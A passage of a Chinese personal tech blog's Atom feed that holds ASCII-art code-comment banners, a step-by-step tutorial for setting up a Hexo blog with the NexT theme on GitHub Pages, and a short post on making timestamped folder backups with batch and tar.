class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * _ooOoo_</span><br><span class="line"> * o8888888o</span><br><span class="line"> * 88&quot; . &quot;88</span><br><span class="line"> * (| -_- |)</span><br><span class="line"> *  O\ &#x3D; &#x2F;O</span><br><span class="line"> * ___&#x2F;&#96;---&#39;\____</span><br><span class="line"> * .   &#39; \\| |&#x2F;&#x2F; &#96;.</span><br><span class="line"> * &#x2F; \\||| : |||&#x2F;&#x2F; \</span><br><span class="line"> * &#x2F; _||||| -:- |||||- \</span><br><span class="line"> * | | \\\ - &#x2F;&#x2F;&#x2F; | |</span><br><span class="line"> * | \_| &#39;&#39;\---&#x2F;&#39;&#39; | |</span><br><span class="line"> * \ .-\__ &#96;-&#96; ___&#x2F;-. &#x2F;</span><br><span class="line"> * ___&#96;. .&#39; &#x2F;--.--\ &#96;. . __</span><br><span class="line"> * .&quot;&quot; &#39;&lt; &#96;.___\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.</span><br><span class="line"> * | | : &#96;- \&#96;.;&#96;\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |</span><br><span class="line"> * \ \ &#96;-. \_ __\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;</span><br><span class="line"> * &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> * &#96;&#x3D;---&#x3D;&#39;</span><br><span class="line"> * .............................................</span><br><span class="line"> * 佛曰：bug泛滥，我已瘫痪！</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><strong>啪</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *                                         ,s555SB@@&amp;                          </span><br><span class="line"> *                                      :9H####@@@@@Xi                        </span><br><span class="line"> *                                     1@@@@@@@@@@@@@@8                       </span><br><span class="line"> *                                   ,8@@@@@@@@@B@@@@@@8                      </span><br><span class="line"> *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   </span><br><span class="line"> *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 </span><br><span class="line"> *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                </span><br><span class="line"> *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               </span><br><span class="line"> *            ;@&amp;i,58r5                 rGSS:     :B@@@@@@@@@@A               </span><br><span class="line"> *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               </span><br><span class="line"> *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                </span><br><span class="line"> *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  </span><br><span class="line"> *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               </span><br><span class="line"> *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          </span><br><span class="line"> *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        </span><br><span class="line"> *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;,      </span><br><span class="line"> *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     </span><br><span class="line"> *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     </span><br><span class="line"> *          :3B@@@@@@@@@@@&amp;9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class="line"> *      s&amp;HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    </span><br><span class="line"> *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    </span><br><span class="line"> *  5#@@#&amp;@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    </span><br><span class="line"> *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class="line"> *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    </span><br><span class="line"> *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    </span><br><span class="line"> *           ,ssirhSM@&amp;1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   </span><br><span class="line"> *              ,,,rHAri1h1rh&amp;@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  </span><br><span class="line"> *            .A3hH@#5S553&amp;@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A. </span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> *   </span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p><strong><a href="http://www.asciiworld.com/">Click Here For More</a></strong></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;标准键盘&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P&amp;#x2F;S│S L│P&amp;#x2F;B│  ┌┐    ┌┐    ┌┐&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * │~ &amp;#96;│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp;amp; 7│* 8│( 9│) 0│_ -│+ &amp;#x3D;│ BacSp │ │Ins│Hom│PUp│ │N L│ &amp;#x2F; │ * │ - │&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │&amp;#123; [│&amp;#125; ]│ | \ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│&amp;quot; &amp;#39;│ Enter  │               │ 4 │ 5 │ 6 │   │&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&amp;lt; ,│&amp;gt; .│? &amp;#x2F;│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; *&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo+NexT搭建博客</title>
    <link href="https://blog.todest.cn/post/277d2a74/"/>
    <id>https://blog.todest.cn/post/277d2a74/</id>
    <published>2020-04-08T07:35:04.000Z</published>
    <updated>2020-05-11T09:31:24.400Z</updated>
    
    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h4><p>注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为<code>todest.github.io</code>，<code>todest</code>为用户名，修改成你自己的。</p><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>从此处 <a href="https://git-scm.com/">Git官网</a> 下载并安装，右键打开<code>Git Bash</code>。<br><a id="more"></a></p><h5 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span><span class="comment"># 连续回车</span></span><br></pre></td></tr></table></figure><p>将<code>&quot;C:\Users\你的用户名\.ssh\id_rsa.pub&quot;</code>的内容复制下来，打开<code>GitHub设置-&gt;SSH and GPG keys-&gt;New SSH key</code>，粘贴到此处确定。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># 测试SSH是否配置好</span></span><br><span class="line"><span class="comment"># 看到You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="comment"># 则说明配置好了，否则无法使用hexo d</span></span><br></pre></td></tr></table></figure></p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>从 <a href="https://nodejs.org">Node.js官网</a> 下载安装。</p><h4 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p><code>install</code>可简写为 <code>i</code> 。</p><h4 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog<span class="comment"># Blog可以修改成其他的名字</span></span><br><span class="line"><span class="built_in">cd</span> Blog<span class="comment"># 进入Blog文件夹</span></span><br></pre></td></tr></table></figure><h4 id="安装Hexo扩展"><a href="#安装Hexo扩展" class="headerlink" title="安装Hexo扩展"></a>安装Hexo扩展</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h4><p>以下<code>g</code>是<code>generate</code>的缩写，<code>s</code>是<code>start</code>的缩写，<code>d</code>是<code>deploy</code>的缩写。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g<span class="comment"># 生成  此条和后一条可简写为 hexo s -g</span></span><br><span class="line">hexo s<span class="comment"># 预览</span></span><br></pre></td></tr></table></figure><br><code>hexo s</code>是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000">http://localhost:4000</a> 即可看到内容。</p><h4 id="上传到GitHub-Pages"><a href="#上传到GitHub-Pages" class="headerlink" title="上传到GitHub Pages"></a>上传到GitHub Pages</h4><p>上传之前，打开站点配置文件<code>_config.yml</code>，位于站点根目录下，修改最后一部分为如下部分。<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:todest/todest.github.io.git</span>    <span class="comment"># 修改为你的GitHub用户名</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><br>上传到<code>GitHub Pages</code>。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g<span class="comment"># 此条和后一条可简写为 hexo d -g</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p><h4 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h4><p>主题位置<code>themes</code>目录下，默认为<code>landscape</code>主题。可从官网 <a href="https://hexo.io/themes/">https://hexo.io/themes/</a> 下载，推荐<code>NexT</code>主题，以下为安装方法。<br>安装过程就一行代码，站点根目录下运行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><br>打开站点配置文件<code>_config.yml</code>，找到<code>theme： landscape</code>，修改为<code>next</code>就可以了。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;h4 id=&quot;GitHub&quot;&gt;&lt;a href=&quot;#GitHub&quot; class=&quot;headerlink&quot; title=&quot;GitHub&quot;&gt;&lt;/a&gt;GitHub&lt;/h4&gt;&lt;p&gt;注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为&lt;code&gt;todest.github.io&lt;/code&gt;，&lt;code&gt;todest&lt;/code&gt;为用户名，修改成你自己的。&lt;/p&gt;
&lt;h4 id=&quot;Git&quot;&gt;&lt;a href=&quot;#Git&quot; class=&quot;headerlink&quot; title=&quot;Git&quot;&gt;&lt;/a&gt;Git&lt;/h4&gt;&lt;p&gt;从此处 &lt;a href=&quot;https://git-scm.com/&quot;&gt;Git官网&lt;/a&gt; 下载并安装，右键打开&lt;code&gt;Git Bash&lt;/code&gt;。&lt;br&gt;</summary>
    
    
    
    <category term="Web" scheme="https://blog.todest.cn/categories/Web/"/>
    
    <category term="博客" scheme="https://blog.todest.cn/categories/Web/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Hexo" scheme="https://blog.todest.cn/tags/Hexo/"/>
    
    <category term="NexT" scheme="https://blog.todest.cn/tags/NexT/"/>
    
  </entry>
  
  <entry>
    <title>批处理备份</title>
    <link href="https://blog.todest.cn/post/2e9e806c/"/>
    <id>https://blog.todest.cn/post/2e9e806c/</id>
    <published>2020-04-08T07:34:26.000Z</published>
    <updated>2020-05-11T09:46:51.506Z</updated>
    
    <content type="html"><![CDATA[<h1 id="以当前时间备份文件"><a href="#以当前时间备份文件" class="headerlink" title="以当前时间备份文件"></a>以当前时间备份文件</h1><p><code>sample</code>是待备份文件夹</p><p>windows<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%time:~0,1%</span>&quot; <span class="keyword">EQU</span> &quot; &quot; (</span><br></pre></td></tr></table></figure></p><p>linux<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time=$(date <span class="string">&#x27;+%Y%m%d%H%M%S&#x27;</span> )</span><br><span class="line">tar -cvf ./backup/<span class="variable">$time</span>.tar ./sample/</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;以当前时间备份文件&quot;&gt;&lt;a href=&quot;#以当前时间备份文件&quot; class=&quot;headerlink&quot; title=&quot;以当前时间备份文件&quot;&gt;&lt;/a&gt;以当前时间备份文件&lt;/h1&gt;&lt;p&gt;&lt;code&gt;sample&lt;/code&gt;是待备份文件夹&lt;/p&gt;
&lt;p&gt;windows&lt;</summary>
      
    
    
    
    <category term="操作系统" scheme="https://blog.todest.cn/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Shell" scheme="https://blog.todest.cn/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Shell/"/>
    
    
    <category term="批处理" scheme="https://blog.todest.cn/tags/%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
</feed>
